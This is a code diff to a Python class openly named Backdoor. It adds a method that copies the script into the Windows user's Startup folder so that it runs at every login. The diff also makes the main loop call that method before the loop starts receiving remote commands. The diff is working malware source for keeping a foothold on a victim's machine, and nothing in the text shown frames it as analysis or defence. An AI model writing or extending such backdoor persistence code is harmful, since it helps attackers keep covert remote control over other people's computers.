@@ -109,7 +109,16 @@ class Backdoor:
 			return f"[-] No such file or directory: '{path}'"
 
 
+	def set_autorun_self(self):
+		username = os.getlogin()
+		startup_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+		command = f'copy "try.py" "{startup_path}\\try.py"'
+		print(command)
+		os.system(command)
+
+
 	def run(self):
+		self.set_autorun_self()
 		while True:
 			if self.connected:
 				command = self.reliable_recive()
